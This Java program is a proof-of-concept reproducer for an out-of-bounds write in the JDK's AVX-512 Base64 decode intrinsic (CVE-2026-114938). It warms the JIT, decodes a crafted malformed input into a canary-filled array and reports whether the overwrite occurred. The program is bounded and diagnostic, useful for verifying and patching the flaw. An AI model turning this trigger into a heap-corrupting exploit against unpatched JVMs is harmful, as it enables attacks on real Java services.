import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Bounded, non-destructive trigger for CVE-2026-114938 (Java4Shell).
 *
 * The decoded output is written into a large caller-supplied array, so the
 * 64-byte masked store stays inside a real Java array.  We can therefore
 * measure the out-of-bounds write without corrupting the heap.
 *
 * Vulnerable intrinsic:
 *   - OpenJDK 17.0.6+ / 21 / 25 / 27 on x86-64 with AVX-512 VBMI
 *   - JIT (C2) must have compiled the Base64 decode path first
 *
 * Trigger input:
 *   - JDK 21/25/27: 64 x 'A' + "="   (65 bytes)
 *   - JDK 17:      128 x 'A' + "="  (129 bytes)
 *
 * Expected result on a vulnerable JVM:
 *   rejected=true, changed=62, first=<decodedLen>, last=<decodedLen+61>
 *
 * Expected result with -XX:-UseBASE64Intrinsics (control):
 *   rejected=true, changed=0
 */
public final class Base64Trigger {
    private static volatile int sink;

    public static void main(String[] args) {
        int warmup = 200_000;
        int targetSize = 4096;
        boolean showBytes = false;

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--warmup":
                    warmup = Integer.parseInt(args[++i]);
                    break;
                case "--target-size":
                    targetSize = Integer.parseInt(args[++i]);
                    break;
                case "--show-bytes":
                    showBytes = true;
                    break;
                case "-h":
                case "--help":
                    System.out.println("usage: Base64Trigger [--warmup N] [--target-size N] [--show-bytes]");
                    return;
                default:
                    System.err.println("unknown option: " + args[i]);
                    System.exit(2);
            }
        }

        boolean isJdk17 = Runtime.version().feature() <= 17;
        int aCount = isJdk17 ? 128 : 64;
        byte[] valid = repeat((byte) 'A', aCount);
        byte[] malformed = repeat((byte) 'A', aCount + 1);
        malformed[aCount] = (byte) '=';

        int decodedLen = ((malformed.length + 3) / 4) * 3 - 1;
        int storeStart = (malformed.length / 4) * 3;
        int expectedChanged = (storeStart + 64) - decodedLen;

        if (targetSize < decodedLen) {
            System.err.println("target-size must be >= " + decodedLen);
            System.exit(2);
        }

        System.out.println("runtime      = " + System.getProperty("java.runtime.version"));
        System.out.println("vm           = " + System.getProperty("java.vm.name"));
        System.out.println("arch         = " + System.getProperty("os.arch"));
        System.out.println("inputLength  = " + malformed.length);
        System.out.println("decodedLen   = " + decodedLen);
        System.out.println("storeStart   = " + storeStart + " (64-byte store window: "
                + storeStart + ".." + (storeStart + 63) + ")");
        System.out.println("warmup       = " + warmup);
        System.out.println("targetSize   = " + targetSize);
        System.out.flush();

        Base64.Decoder decoder = Base64.getDecoder();

        // Warm the decode path so C2 replaces it with the AVX-512 intrinsic.
        byte[] warm = new byte[targetSize];
        for (int i = 0; i < warmup; i++) {
            sink += decoder.decode(valid, warm);
        }
        Arrays.fill(warm, (byte) 0);

        // Fresh array, canary-filled.  The intrinsic writes 2 decoded bytes
        // at [storeStart, storeStart+1] and then 62 bytes past the logical
        // end of the decoded data.  All of it remains inside this array.
        byte[] target = new byte[targetSize];
        Arrays.fill(target, (byte) 0x5a);

        boolean rejected = false;
        try {
            decoder.decode(malformed, target);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int changed = 0;
        int first = -1;
        int last = -1;
        for (int i = decodedLen; i < target.length; i++) {
            if (target[i] != (byte) 0x5a) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }

        System.out.println("rejected     = " + rejected);
        System.out.println("changed      = " + changed + " (expected " + expectedChanged + ")");
        System.out.println("first        = " + first + " (expected " + decodedLen + ")");
        System.out.println("last         = " + last + " (expected " + (decodedLen + 61) + ")");

        if (showBytes) {
            int from = Math.max(0, decodedLen - 4);
            int to = Math.min(target.length, storeStart + 64);
            StringBuilder sb = new StringBuilder();
            for (int i = from; i < to; i++) {
                if (i == decodedLen) sb.append("| ");
                sb.append(String.format("%02x ", target[i] & 0xff));
            }
            System.out.println("bytes[" + from + ".." + (to - 1) + "] (| marks logical end) = " + sb);
        }

        boolean reproduced = rejected
                && changed == expectedChanged
                && first == decodedLen
                && last == decodedLen + 61;

        if (!reproduced) {
            System.err.println("NOT REPRODUCED");
            System.exit(1);
        }
        System.out.println("REPRODUCED");
    }

    private static byte[] repeat(byte value, int count) {
        byte[] out = new byte[count];
        Arrays.fill(out, value);
        return out;
    }
}
